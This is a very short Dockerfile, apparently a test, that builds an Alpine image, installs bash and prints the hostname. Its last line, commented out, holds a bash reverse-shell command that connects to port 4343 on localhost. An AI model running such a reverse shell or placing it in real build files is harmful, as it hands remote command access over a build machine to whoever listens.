FROM alpine
RUN apk update && apk add bash
RUN hostname
#RUN /bin/bash  -c 'bash -i >& /dev/tcp/127.0.0.1/4343 0>&1'
